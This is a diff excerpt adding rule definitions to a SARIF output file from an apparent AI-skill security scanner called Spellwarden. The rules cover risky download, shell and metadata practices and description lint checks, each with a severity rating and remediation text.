+              "shortDescription": {
+                "text": "Fetches external URL content into context without an allowlist"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "help": {
+                "markdown": "Add a license line, such as MIT or Apache-2.0, and a version line to the skill, and raise the version whenever the skill changes.\n\n[How to fix SW-SKL-031](https://spellwarden.ai/docs/rules/sw-skl-031?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add a license line, such as MIT or Apache-2.0, and a version line to the skill, and raise the version whenever the skill changes."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-031?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-031",
+              "name": "MissingLicenseAndVersionMetadata",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AST04"
+                ]
+              },
+              "shortDescription": {
+                "text": "Missing license and version metadata"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site.\n\n[How to fix SW-SKL-032](https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-032",
+              "name": "InstructionsLureTheUserIntoRunningAPasswordProtectedDownloadOrAPastedScript",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "ASI09",
+                  "SR-3",
+                  "SI-3",
+                  "AML.T0011",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Instructions lure the user into running a password-protected download or a pasted script"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Scope each pre-approved shell entry to the named program the skill runs, or drop the entry if the skill needs no shell.\n\n[How to fix SW-SKL-036](https://spellwarden.ai/docs/rules/sw-skl-036?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Scope each pre-approved shell entry to the named program the skill runs, or drop the entry if the skill needs no shell."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-036?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-036",
+              "name": "FrontmatterPreApprovesAnUnscopedShellOrInterpreter",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI02",
+                  "ASI03",
+                  "AC-6",
+                  "CM-7",
+                  "AML.T0053",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Frontmatter pre-approves an unscoped shell or interpreter"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Download a release with a version in its address and compare its published checksum or signature before you make the file executable.\n\n[How to fix SW-SKL-037](https://spellwarden.ai/docs/rules/sw-skl-037?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Download a release with a version in its address and compare its published checksum or signature before you make the file executable."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-037?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-037",
+              "name": "ExecutableDownloadedFromAMovingReferenceAndRunWithoutAnIntegrityCheck",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "ASI05",
+                  "MCP04",
+                  "SR-3",
+                  "SI-7",
+                  "AML.T0010.005",
+                  "AML.T0109",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Executable downloaded from a moving reference and run without an integrity check"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://spellwarden.ai/docs/activation-checks?utm_source=scanner&utm_medium=cli&utm_campaign=description-lint",
+              "id": "SW-LINT-001",
+              "name": "DescriptionShorterThan40OrLongerThan1024Characters",
+              "properties": {
+                "tags": [
+                  "description-lint"
+                ]
+              },
+              "shortDescription": {
+                "text": "Description shorter than 40 or longer than 1024 characters"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://spellwarden.ai/docs/activation-checks?utm_source=scanner&utm_medium=cli&utm_campaign=description-lint",
+              "id": "SW-LINT-002",
+              "name": "DescriptionHasNoUseWhenClause",
+              "properties": {
+                "tags": [
+                  "description-lint"
+                ]
+              },
+              "shortDescription": {
+                "text": "Description has no use-when clause"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://spellwarden.ai/docs/activation-checks?utm_source=scanner&utm_medium=cli&utm_campaign=description-lint",
+              "id": "SW-LINT-003",
+              "name": "DescriptionNamesNoTriggerPhrase",
+              "properties": {
+                "tags": [
+                  "description-lint"
+                ]
+              },
+              "shortDescription": {
+                "text": "Description names no trigger phrase"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://spellwarden.ai/docs/activation-checks?utm_source=scanner&utm_medium=cli&utm_campaign=description-lint",
+              "id": "SW-LINT-004",
+              "name": "DescriptionsOfTwoSkillsOverlap",
+              "properties": {
+                "tags": [
+                  "description-lint"
+                ]
+              },
+              "shortDescription": {
+                "text": "Descriptions of two skills overlap"
+              }
+            }
+          ],
+          "semanticVersion": "1.22.0"
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
